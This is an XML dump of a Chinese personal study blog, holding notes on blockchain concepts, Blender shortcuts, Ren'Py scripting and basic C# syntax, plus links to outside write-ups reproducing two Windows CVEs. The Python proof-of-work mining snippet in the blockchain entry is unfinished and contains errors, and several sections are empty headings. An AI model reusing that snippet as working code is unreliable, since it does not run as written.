永恒之蓝（CVE-2017-0146）"></a>2 永恒之蓝（CVE-2017-0146）</h3><blockquote><p><a href="https://blog.csdn.net/weixin_43913009/article/details/123887992">永恒之蓝复现链接</a></p></blockquote><h3 id="3-震网三代（CVE-2017-8464）"><a href="#3-震网三代（CVE-2017-8464）" class="headerlink" title="3 震网三代（CVE-2017-8464）"></a>3 震网三代（CVE-2017-8464）</h3><blockquote><p><a href="https://blog.csdn.net/dgjkkhcf/article/details/125940189">CVE-2017-8464（震网三代）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链技术</title>
      <link href="/posts/9ad5026b.html"/>
      <url>/posts/9ad5026b.html</url>
      
        <content type="html"><![CDATA[<h1 id="区块链技术"><a href="#区块链技术" class="headerlink" title="区块链技术"></a>区块链技术</h1><blockquote><p><a href="https://blockexplorer.com/">区块链网站</a></p><p><a href="https://blockchaindemo.io/">模拟区块链</a></p></blockquote><hr><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1 基础知识"></a>1 基础知识</h3><ul><li><p>定义</p><blockquote><p>区块链是一种分布式数据库：通过网络连接的节点，每个节点都保存着整个数据库所有数据，任何地点存入的数据都会完成同步。</p><p>一个节点由：数据，自身哈希值，上一节点哈希值组成。</p></blockquote></li><li><p>特点</p><ol><li>分布式网络。</li><li>可建立信任。</li><li>公开透明。</li><li>不可篡改。除非改 51% 的节点。</li></ol></li><li><p>局限性</p><ol><li><p>运行安全风险。</p><blockquote><p><a href="https://blog.csdn.net/triaslab/article/details/85232634">自私挖矿</a></p><p><a href="https://baike.baidu.com/item/双重支付/7046722">双重支付</a></p></blockquote></li><li><p>系统效率及可扩展性问题。</p></li><li><p>隐私泄露风险。</p></li></ol></li><li><p>发展史</p><ol><li>1.0：比特币得到广泛应用。</li><li>2.0：”数字货币“与<a href="https://zhuanlan.zhihu.com/p/413502024">智能合约</a>结合。（智能合约：区块链中的一段自动监督的代码）</li><li>3.0：泛行业去中心化应用。</li></ol></li><li><p>分类</p><ol><li><p>公有链</p><blockquote><p>向公众开放，用户可匿名参与，无需注册，可以在未经授权的情况下访问网络和区块链。</p><p>无法篡改、地吞吐量、交易缓慢。</p></blockquote></li><li><p>联盟链</p><blockquote><p>仅联盟成员参与，链权限由联盟成员制定。因为该链是一种需要注册许可的区块链，所以又叫许可链。</p><p>部分去中心化、可控性较强、数据不会默认公开、交易速度很快。</p></blockquote></li><li><p>私有链</p><blockquote><p>仅私有组织使用，权限组织定，也是许可链。</p><p>速度非常快、隐私保障更好、交易成本低、保证基本产品不易被破坏。</p></blockquote></li><li><p>侧链</p><blockquote><p>能与比特币区块链交互，并与比特币挂钩的区块链。</p><p>因为比特币不易创新和拓展。</p></blockquote></li><li><p>互联链</p><blockquote><p>针对特定领域的应用可以在各自的垂直领域形成区块链。</p></blockquote></li></ol></li></ul><h3 id="2-体系机构"><a href="#2-体系机构" class="headerlink" title="2 体系机构"></a>2 体系机构</h3><ol><li>数据层：存储数据。</li><li>网络层：节点和节点之间信息交换。</li><li>共识层：数据的有效性。</li><li>激励层：激励方法。</li><li>智能合约层：封装了各种脚本、程序和合约。</li><li>应用层：封装了区块链的各种应用和场景。</li></ol><blockquote><p><a href="https://zhuanlan.zhihu.com/p/379921778">结构</a></p><p>底下三层是区块链必须的。（1、2、3）</p></blockquote><h3 id="3-其他关系"><a href="#3-其他关系" class="headerlink" title="3 其他关系"></a>3 其他关系</h3><ul><li><p><strong>大数据</strong></p><blockquote><p>提供如下更好的保障：</p></blockquote><ol><li>数据安全。</li><li>数据开发共享。</li><li>数据存储。</li><li>数据分析。</li><li>数据流通。</li></ol></li><li><p><strong>云计算</strong></p><blockquote><p>IaaS + PaaS + SaaS == BaaS（区块链即服务）</p></blockquote></li></ul><hr><h2 id="二、语言"><a href="#二、语言" class="headerlink" title="二、语言"></a>二、语言</h2><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><h3 id="1-基本模块"><a href="#1-基本模块" class="headerlink" title="1 基本模块"></a>1 基本模块</h3><blockquote><p>hashlib</p><p>datetime</p><p>Struct</p><p>Urllib / requests</p></blockquote><h3 id="2-图形化模块"><a href="#2-图形化模块" class="headerlink" title="2 图形化模块"></a>2 图形化模块</h3><blockquote><p>Tkinter</p><p>PyQT5</p></blockquote><h3 id="3-Web模块"><a href="#3-Web模块" class="headerlink" title="3 Web模块"></a>3 Web模块</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/95942024">WSGI</a></p></blockquote><ul><li>flask：轻量（Werkzeng：WSGI 工具集，jinja2：渲染模块）（WSGI：Web服务器网关结构）</li><li>Django：全能型 Web 框架。</li><li>Web.py：小巧的 Web 框架。</li><li>Bottle：和 Flask 类似的框架。</li><li>Tomado：Facebook 的开源异步 Web 框架。</li></ul><hr><h2 id="三、核心技术"><a href="#三、核心技术" class="headerlink" title="三、核心技术"></a>三、核心技术</h2><blockquote><p><a href=".\7302411">text::Crypto密码</a></p></blockquote><h3 id="1-加密技术"><a href="#1-加密技术" class="headerlink" title="1 加密技术"></a>1 加密技术</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/109554422">数据脱敏</a>    <a href="https://zhuanlan.zhihu.com/p/139114240">差分隐私</a></p><p>HASH-256，ECC，数字签名，数字证书，密钥分存，匿名技术，数据脱敏，差分隐私。</p></blockquote><h3 id="2-核心问题"><a href="#2-核心问题" class="headerlink" title="2 核心问题"></a>2 核心问题</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/155708128">BFT</a>    <a href="https://zhuanlan.zhihu.com/p/335617791">CAP</a>    <a href="https://zhuanlan.zhihu.com/p/548399740">ELP</a></p></blockquote><ul><li><p>一致性问题</p></li><li><p>拜占庭将军问题</p><blockquote><p>问题：存在叛军让通信出错。</p><p>N &gt;= 3F + 1（N：总节点，F：叛军）</p></blockquote></li><li><p>ELP不可能</p><blockquote><p>ELP不可能：在异步网络下，如果有一台机器可能出错，则没有任何确定性共识算法保证在有限时间内结束。</p><p>CAP：一致性，可用性，分区容忍性三个只能同时满足两个。</p></blockquote></li></ul><h3 id="3-共识机制"><a href="#3-共识机制" class="headerlink" title="3 共识机制"></a>3 共识机制</h3><ul><li>PoW机制<blockquote><p>定义<br>优点<br>缺点</p></blockquote></li><li>PoW算法的实现<ol><li>计算出一个”区块头”的hash值，即为当前区块的所有交易信息。</li><li>由于随机数是任意的，因此需要不断更改随机数重新计算hash值。</li><li>当找到一个满足条件的hash值后，将其作为”工作证明”发送给网络上其他结点，其他结点可以轻松验证这个工作量证明是否正确。</li><li>验证无误其他结点会接受这个新区块，这个结点也会被加到区块链上。</li><li>其他结点开始计算下一个区块的hash值。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mine_block</span>(<span class="params">difficulty,block_data</span>):</span><br><span class="line">  start_time = time.time()</span><br><span class="line">  nonce = <span class="number">0</span></span><br><span class="line">  target = <span class="string">&#x27;0&#x27;</span> + difficulty</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 挖矿过程</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data_str = <span class="built_in">str</span>(block_data) +<span class="built_in">str</span>(nonce)</span><br><span class="line">    block_hash = hashlib.sha256(data.<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>).hexdigest())</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ...</span><br><span class="line">  nonce += <span class="number">1</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure></li></ol></li><li>PoS机制<blockquote><p>定义<br>优点<br>缺点<br>长程攻击，双花。</p></blockquote></li><li><p>PoS算法实现</p><blockquote></blockquote></li><li>DPoS机制<blockquote><p>定义<br>优点<br>缺点</p></blockquote></li><li>分布式一致性算法<blockquote><p>定义</p><ul><li>CFT算法<br>定义<ul><li>Fast Paxos</li><li>Multi-Paxo</li><li>Kafks</li></ul></li><li>BFT算法<br>定义<ul><li>Hot-stuff</li><li>SBFT</li><li>Honey Badger BFT</li></ul></li></ul></blockquote></li><li>共识机制比较</li><li>跨链共识机制</li></ul><hr><h2 id="四、数据存储"><a href="#四、数据存储" class="headerlink" title="四、数据存储"></a>四、数据存储</h2><h3 id="1-哈希指针与区块链"><a href="#1-哈希指针与区块链" class="headerlink" title="1 哈希指针与区块链"></a>1 哈希指针与区块链</h3><ul><li>定义    </li><li>实现</li></ul><h3 id="2-梅克尔树"><a href="#2-梅克尔树" class="headerlink" title="2 梅克尔树"></a>2 梅克尔树</h3><ul><li>定义</li><li>实现</li></ul><h3 id="3-案例"><a href="#3-案例" class="headerlink" title="3 案例"></a>3 案例</h3><ul><li>100%准备金证明</li><li>分布式存储</li></ul><hr><h2 id="五、网络架构"><a href="#五、网络架构" class="headerlink" title="五、网络架构"></a>五、网络架构</h2><h3 id="1-网络架构"><a href="#1-网络架构" class="headerlink" title="1 网络架构"></a>1 网络架构</h3><ul><li><p>节点特点</p><ul><li>存储链或链的一部分。</li><li>连接网络。</li><li><p>参与区块链。</p></li><li><p>节点类型</p><ul><li><p>轻节点</p><blockquote><p>只储存最小量的状态来作为发送或传递交易讯息的节点。</p></blockquote></li><li><p>全节点</p><blockquote><p>验证矿工挖出的块，存储区块链的完整副本。</p></blockquote></li><li><p>普通节点</p><blockquote><p>维护区块链的网络运行。</p></blockquote></li><li><p>矿工节点</p><blockquote><p>产生块。</p></blockquote></li><li><p>超级节点</p><blockquote><p>同时具有全节点和矿工节点的特点。</p></blockquote></li></ul></li></ul></li><li><p>系统类型</p><ul><li>中心化系统</li><li>多中心化系统</li><li><p>去中心化系统</p></li><li><p>网络成员</p><ul><li><p>钱包</p><blockquote><p>比特币交易，信息查询。</p></blockquote></li><li><p>矿工</p><blockquote><p>挖矿领奖。</p></blockquote></li><li><p>完整区块数据存储</p><blockquote><p>整个区块链。</p></blockquote></li><li><p>网络路由</p><blockquote><p>网络维护。</p></blockquote></li></ul></li></ul></li></ul><h3 id="2-比特币网络"><a href="#2-比特币网络" class="headerlink" title="2 比特币网络"></a>2 比特币网络</h3><hr><h2 id="六、以太坊"><a href="#六、以太坊" class="headerlink" title="六、以太坊"></a>六、以太坊</h2><h3 id="1-以太坊技术"><a href="#1-以太坊技术" class="headerlink" title="1 以太坊技术"></a>1 以太坊技术</h3><blockquote><p><a href="https://ethereum.org/zh/">official::以太坊</a></p><p><a href="https://zhuanlan.zhihu.com/p/390884462">以太坊定义</a></p></blockquote><h3 id="2-智能合约"><a href="#2-智能合约" class="headerlink" title="2 智能合约"></a>2 智能合约</h3><h2 id="七、区块链技术改进"><a href="#七、区块链技术改进" class="headerlink" title="七、区块链技术改进"></a>七、区块链技术改进</h2><h3 id="1-增强匿名性"><a href="#1-增强匿名性" class="headerlink" title="1 增强匿名性"></a>1 增强匿名性</h3><blockquote><p>区块链技术最有争议性的一个特性就是匿名性。</p></blockquote><ul><li><p>匿名性分析</p></li><li><p>混币交易</p><p>&gt;</p></li><li><p>零知识证明</p><blockquote><p>证明者能够在不向被证明者提供任何有用信息的情况下，使被证明者相信某个论断是正确的。</p><p>例：邮递员与邮箱。<br>邮递员可以通过将被证明者投入邮箱的信件拿出并给被证明者看，以此证明邮递员有邮箱的密钥。这样就可以向被证明者证明邮递员有密钥同时密钥也没有泄露给被证明者。</p><p><a href="https://zhuanlan.zhihu.com/p/145904278">Zcash</a></p></blockquote></li></ul><h3 id="2-加强去中心化"><a href="#2-加强去中心化" class="headerlink" title="2 加强去中心化"></a>2 加强去中心化</h3>]]></content>
      
      
      <categories>
          
          <category> 新技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blender</title>
      <link href="/posts/52bae00c.html"/>
      <url>/posts/52bae00c.html</url>
      
        <content type="html"><![CDATA[<h1 id="Blender"><a href="#Blender" class="headerlink" title="Blender"></a>Blender</h1><hr><h2 id="一、基础操作"><a href="#一、基础操作" class="headerlink" title="一、基础操作"></a>一、基础操作</h2><h3 id="1-快捷键"><a href="#1-快捷键" class="headerlink" title="1 快捷键"></a>1 快捷键</h3><blockquote><p>a：全选 </p><p>x：删除 </p><p>shift + a：新建物体 </p><p>alt + z：透视模式</p></blockquote><h3 id="2-视图"><a href="#2-视图" class="headerlink" title="2 视图"></a>2 视图</h3><blockquote><p>~ ：快速选择视图</p><p>小键盘：<br>1：主视图<br>3：右视图<br>7：俯视图<br>9：仰视图</p><p>ctrl + num：取相反</p></blockquote><h3 id="3-操作栏"><a href="#3-操作栏" class="headerlink" title="3 操作栏"></a>3 操作栏</h3><blockquote><p>界面最下方有操作提示。</p><p>alt + button：清空指定改变（g，r，s）</p></blockquote><ul><li><p>框选</p><blockquote><p>框选：选取物体。</p></blockquote></li><li><p>游标</p><blockquote><p>游标：新生成的物体坐标。</p><p>shift + c：游标归位</p></blockquote></li><li><p>移动</p><blockquote><p>移动：移动选中的物体。</p><p>滚轮：移动视角。</p><p>g：移动物体（+ x/y/z/中键 ：在指定方向移动）（ + meter：移动指定米数）</p></blockquote></li><li><p>旋转</p><blockquote><p>旋转：转动选中的物体。</p><p>r：旋转物体（+ x/y/z/中键 ：在指定方向旋转）（ + angle：旋转指定度数）</p></blockquote></li><li><p>缩放</p><blockquote><p>缩放：调整物体的尺寸。</p><p>s：调整物体（+ x/y/z/ 中键 ：在指定方向缩放）（ + meter：缩放指定倍数）</p></blockquote></li></ul><h3 id="4-tab模式"><a href="#4-tab模式" class="headerlink" title="4 tab模式"></a>4 tab模式</h3><blockquote><p>tab：进入物体编辑模式。（点、线、面）</p><p>1、2、3：点、线、面。</p></blockquote><ul><li><p>点</p></li><li><p>线</p></li><li><p>面</p><blockquote><p>e：挤出：只有选定区域被挤出</p><p>i：内插面</p><p>ctrl + r：环切：切出一个线或面（+ 右键：居中切割）/ （+ 滚轮：增加/减少环切线）</p><p>alt + s：法向缩放（存疑）</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 游戏美术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 建模 </tag>
            
            <tag> Blender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Renpy</title>
      <link href="/posts/cca63ac3.html"/>
      <url>/posts/cca63ac3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Renpy"><a href="#Renpy" class="headerlink" title="Renpy"></a>Renpy</h1><blockquote><p><a href="http://www.renpy.cn/doc/index.html">official::官方文档</a></p></blockquote><hr><h2 id="一、简单使用"><a href="#一、简单使用" class="headerlink" title="一、简单使用"></a>一、简单使用</h2><h3 id="1-编辑器使用"><a href="#1-编辑器使用" class="headerlink" title="1 编辑器使用"></a>1 编辑器使用</h3><h3 id="2-代码编写"><a href="#2-代码编写" class="headerlink" title="2 代码编写"></a>2 代码编写</h3><h4 id="2-1-输入"><a href="#2-1-输入" class="headerlink" title="2.1 输入"></a>2.1 输入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python:</span><br><span class="line">n = renpy.<span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-2-输出"><a href="#2-2-输出" class="headerlink" title="2.2 输出"></a>2.2 输出</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在语句中变量用 [n] 括起则可以输出变量的值</span></span><br><span class="line">i <span class="string">&quot;n is [n]&quot;</span></span><br></pre></td></tr></table></figure><h4 id="2-3-变量赋值"><a href="#2-3-变量赋值" class="headerlink" title="2.3 变量赋值"></a>2.3 变量赋值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单个变量赋值</span></span><br><span class="line">menu:</span><br><span class="line">    <span class="string">&quot;你选择&quot;</span></span><br><span class="line">    <span class="string">&quot;继续&quot;</span>:</span><br><span class="line">        $ out = <span class="number">1</span></span><br><span class="line">    <span class="string">&quot;结束&quot;</span>:</span><br><span class="line">        $ out = <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="2-3-使用Python语句"><a href="#2-3-使用Python语句" class="headerlink" title="2.3 使用Python语句"></a>2.3 使用Python语句</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行多行python语句</span></span><br><span class="line">python:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">H</span>():</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;hello&quot;</span></span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot; world&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、项目"><a href="#二、项目" class="headerlink" title="二、项目"></a>二、项目</h2><h3 id="1-一键生成Gal"><a href="#1-一键生成Gal" class="headerlink" title="1 一键生成Gal"></a>1 一键生成Gal</h3><blockquote><p><a href="https://github.com/Quandong-Zhang/movie2galagame">author::大佬原项目链接</a>   </p><p><a href="https://github.com/KUN1007/movie2galagame">author::别人优化后链接</a></p><p>效果：在文件夹中放入视频和字幕，软件会根据视频和字幕自动生成Renpy的项目相关文件，然后在Renpy中配置项目后启动即可使用。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Renpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CShape</title>
      <link href="/posts/e2ddfea0.html"/>
      <url>/posts/e2ddfea0.html</url>
      
        <content type="html"><![CDATA[<h1 id="CShape"><a href="#CShape" class="headerlink" title="CShape"></a>CShape</h1><blockquote><p>VS保存为UTF-8：扩展——自定义——搜索ForceUTF8</p></blockquote><hr><h2 id="一、入门"><a href="#一、入门" class="headerlink" title="一、入门"></a>一、入门</h2><h3 id="1-C-特点"><a href="#1-C-特点" class="headerlink" title="1 C#特点"></a>1 C#特点</h3><blockquote><p>命名方式：<br>1.变量前类型后名字，前小写后大写，例子：intNum，strClass<br>2.函数命名大写，属性命名小写.</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">控制台输出一行（自带换行）：Console.WriteLine();</span><br><span class="line">控制台输入一行：<span class="built_in">float</span> num = <span class="built_in">float</span>.Parse(Console.ReadLine());</span><br><span class="line">控制台输出一行（不换行）：Console.Write();</span><br><span class="line">其中Console为类，Write为方法。</span><br><span class="line">    </span><br><span class="line"><span class="built_in">string</span> x：定义字符串x</span><br><span class="line">字符串可以直接用(<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)进行拼接</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> &lt;name&gt;:引用命名空间</span><br><span class="line"><span class="keyword">namespace</span> &lt;<span class="title">name</span>&gt; &#123;&#125;:定义命名空间</span><br><span class="line"><span class="keyword">class</span> &lt;<span class="title">name</span>&gt; &#123;&#125;:定义类</span><br><span class="line"><span class="keyword">void</span> &lt;name&gt; &#123;&#125;:定义函数</span><br><span class="line">Main():主函数</span><br></pre></td></tr></table></figure><h3 id="2-VS操作"><a href="#2-VS操作" class="headerlink" title="2 VS操作"></a>2 VS操作</h3><blockquote><p>VS的补足中（扳手：属性，方块：方法，长方体：字段）<br>Ctrl + A 全选<br>Ctrl + K + F 自动缩进<br>Ctrl + K + C 注释<br>Ctrl + K + U 取消注释<br>Ctrl + R + R 全体重命名<br>Ctrl + F：选择字符串替换</p><p>类中自动补足类中属性：prop + tab + tab</p></blockquote><hr><h2 id="二、类型"><a href="#二、类型" class="headerlink" title="二、类型"></a>二、类型</h2><h3 id="1-一般类型"><a href="#1-一般类型" class="headerlink" title="1 一般类型"></a>1 一般类型</h3><blockquote><p><a href="https://www.cnblogs.com/zhaoshujie/p/9686027.html">详细文档1</a></p><p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.string.format?view=net-5.0">official::官方文档2</a></p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">String str = <span class="built_in">string</span>.Format(<span class="string">&quot;a:&#123;0&#125;,b:&#123;1&#125;&quot;</span>,a,b);    格式化输出设置</span><br><span class="line"><span class="built_in">char</span> a = <span class="string">&#x27;\0&#x27;</span>设置空字符    <span class="built_in">string</span> a = <span class="string">&quot;&quot;</span>设置空字符串</span><br><span class="line"></span><br><span class="line">num++;（先执行num再++）</span><br><span class="line">++num;（先++再执行num）</span><br><span class="line"></span><br><span class="line">N元运算符：几个变量参与运算。</span><br><span class="line">一元运算符：++</span><br><span class="line">二元运算符： +，-，*</span><br><span class="line">三元运算符：（a?b:c）</span><br><span class="line"></span><br><span class="line">类型转化：</span><br><span class="line">x = <span class="built_in">int</span>.Parse(a); <span class="comment">//int(a)-&gt;x</span></span><br><span class="line">x = a.ToString(); <span class="comment">//string(a)-&gt;x</span></span><br><span class="line">执行完操作应当赋值。</span><br><span class="line"></span><br><span class="line">隐式转化（小-&gt;大）：<span class="built_in">byte</span> i4 = <span class="number">300</span>;    <span class="built_in">int</span> i3 = i4;</span><br><span class="line">显示转化（大-&gt;小）：<span class="built_in">int</span> i4;    <span class="built_in">byte</span> i3 = (<span class="built_in">byte</span>) i4;（会丢失数据）</span><br><span class="line"><span class="built_in">byte</span> b = <span class="number">0</span>;    b += <span class="number">3</span>;（不会类型提升b:<span class="built_in">byte</span>）   b = b + <span class="number">3</span>;（会类型提升为<span class="built_in">int</span> b:<span class="built_in">int</span>）</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  v1;    <span class="comment">//依照v1值自动推断类型</span></span><br><span class="line"><span class="built_in">object</span> o1 = <span class="number">1</span>/<span class="literal">true</span>/<span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">3</span>];     <span class="comment">//任意类型</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">enum</span> Directon:<span class="built_in">int</span> &#123;up,down&#125;  <span class="comment">//枚举类型（默认是:int类型）</span></span><br><span class="line">枚举多选：</span><br><span class="line"><span class="number">1.</span>枚举开头处加上[Flags]</span><br><span class="line"><span class="number">2.</span>枚举值为<span class="number">2</span>**n，运算时按位||</span><br><span class="line"><span class="number">3.</span>判断时按位&amp;&amp;</span><br><span class="line">字符串枚举： (枚举) Enum.Parse(<span class="keyword">typeof</span>(枚举),<span class="built_in">string</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="三、选择-循环"><a href="#三、选择-循环" class="headerlink" title="三、选择 | 循环"></a>三、选择 | 循环</h2><h3 id="1-选择"><a href="#1-选择" class="headerlink" title="1 选择"></a>1 选择</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>() &#123;&#125;  <span class="keyword">else</span> <span class="keyword">if</span>()  &#123;&#125;  <span class="keyword">else</span>&#123;&#125;</span><br><span class="line"><span class="keyword">switch</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span> : <span class="keyword">break</span>;</span><br><span class="line"><span class="literal">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-循环"><a href="#2-循环" class="headerlink" title="2 循环"></a>2 循环</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line"><span class="keyword">while</span>()&#123;&#125;</span><br><span class="line"><span class="keyword">do</span>&#123;&#125;<span class="keyword">while</span>();</span><br></pre></td></tr></table></figure><h3 id="3-方法"><a href="#3-方法" class="headerlink" title="3 方法"></a>3 方法</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">创建随机数:Random random = <span class="keyword">new</span> Random();</span><br><span class="line">产生随机数:<span class="built_in">int</span> number = random.Next(<span class="number">1</span>,<span class="number">101</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> 可接 <span class="keyword">return</span>; 返回</span><br><span class="line">字符串操作函数 str.</span><br><span class="line">数组操作函数 Array.</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 写方法注释</span></span><br><span class="line">重载：同名不同参。</span><br></pre></td></tr></table></figure><hr><h2 id="四、数组"><a href="#四、数组" class="headerlink" title="四、数组"></a>四、数组</h2><h3 id="1-一维数组"><a href="#1-一维数组" class="headerlink" title="1 一维数组"></a>1 一维数组</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>[] a;    <span class="comment">//声明</span></span><br><span class="line">a = <span class="keyword">new</span> <span class="built_in">int</span>[n];    <span class="comment">//初始化（默认值为0）</span></span><br><span class="line">变量名和类型应当一致，容量为n。</span><br><span class="line"></span><br><span class="line">srting[] array = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">2</span>]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>&#125;;    <span class="comment">//直接初始化</span></span><br><span class="line"><span class="built_in">bool</span>[] array = &#123;<span class="literal">true</span>,<span class="literal">false</span>&#125;  <span class="comment">//声明+初始化+赋值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(元素类型  变量名  <span class="keyword">in</span>  数组名)  <span class="comment">//获取数组中的每一个元素（不可以改变元素值）</span></span><br><span class="line">例：<span class="keyword">foreach</span>(<span class="built_in">int</span> i <span class="keyword">in</span> array)</span><br><span class="line">Array arr1 = <span class="keyword">new</span> ElemType[];   <span class="comment">//任意数组</span></span><br></pre></td></tr></table></figure><h3 id="2-多维数组"><a href="#2-多维数组" class="headerlink" title="2 多维数组"></a>2 多维数组</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">二维数组：</span><br><span class="line"><span class="built_in">int</span> [,] array = <span class="keyword">new</span> <span class="built_in">int</span>[,];</span><br><span class="line">例：<span class="built_in">int</span>[,] any = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">5</span>,<span class="number">3</span>];    <span class="comment">//5行3列</span></span><br><span class="line"></span><br><span class="line">多维数组：</span><br><span class="line"><span class="built_in">int</span>[,,,] array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>];</span><br></pre></td></tr></table></figure><h3 id="3-交错数组"><a href="#3-交错数组" class="headerlink" title="3 交错数组"></a>3 交错数组</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">定义：不规则的表格（交错数组元素的单位是行（也就是数组））</span><br><span class="line">例：<span class="built_in">int</span>[][] array;    array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">4</span>][];</span><br><span class="line">赋值：array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">3</span>];    <span class="comment">//赋值是赋数组</span></span><br></pre></td></tr></table></figure><h3 id="4-参数数组"><a href="#4-参数数组" class="headerlink" title="4 参数数组"></a>4 参数数组</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">例：Add(<span class="keyword">params</span> <span class="built_in">int</span>[] arr)</span><br><span class="line">对方法内：数组。</span><br><span class="line">对方法外：可以传入数组，可以传入一组同类型的数组，可以不传入参数。</span><br></pre></td></tr></table></figure><h3 id="5-数组方法"><a href="#5-数组方法" class="headerlink" title="5 数组方法"></a>5 数组方法</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">array.GetLength(n)：获得该数组第 n 维的长度。</span><br><span class="line">array.Length：数组第 <span class="number">0</span> 维的长度。</span><br></pre></td></tr></table></figure><hr><h2 id="五、数据类型-存储"><a href="#五、数据类型-存储" class="headerlink" title="五、数据类型 | 存储"></a>五、数据类型 | 存储</h2><h3 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1 数据类型"></a>1 数据类型</h3><blockquote><p>分类：值类型，引用类型。<br>值类型：结构（数据类型，bool/char），枚举，声明栈存入栈。<br>引用类型：接口，类（string，Array，委托，object），声明栈存入堆。</p><p>数组类型传入的是地址.（无需return）<br>bool值类型比较值，引用类型直接比引用。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">array[<span class="number">0</span>] = <span class="number">2</span>;    <span class="comment">//修改的是堆区</span></span><br><span class="line">arr = <span class="keyword">new</span> <span class="built_in">int</span>[]&#123;<span class="number">2</span>&#125;;    <span class="comment">//修改的是栈区</span></span><br><span class="line">S1 = <span class="string">&#x27;男&#x27;</span>;    <span class="comment">//修改的是栈区（堆中的数据不可修改）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ref</span> <span class="built_in">int</span> a;    <span class="comment">//(ref = &amp;)值地址（等于&amp;a）</span></span><br><span class="line"><span class="keyword">out</span> <span class="built_in">int</span> a;    <span class="comment">//输出参数（也是地址操作）</span></span><br><span class="line"><span class="number">1</span>、<span class="keyword">out</span>方法内部必须赋值。</span><br><span class="line"><span class="number">2</span>、<span class="keyword">out</span>传参前可以不赋值。</span><br><span class="line"></span><br><span class="line"><span class="built_in">bool</span> [type].TryParse(input, <span class="keyword">out</span> result);    <span class="comment">//尝试类型转化</span></span><br><span class="line">可转：返回<span class="literal">true</span>和result。</span><br><span class="line">不可转：返回<span class="literal">false</span>，result = <span class="number">0</span>。</span><br></pre></td></tr></table></figure><h3 id="2-存储"><a href="#2-存储" class="headerlink" title="2 存储"></a>2 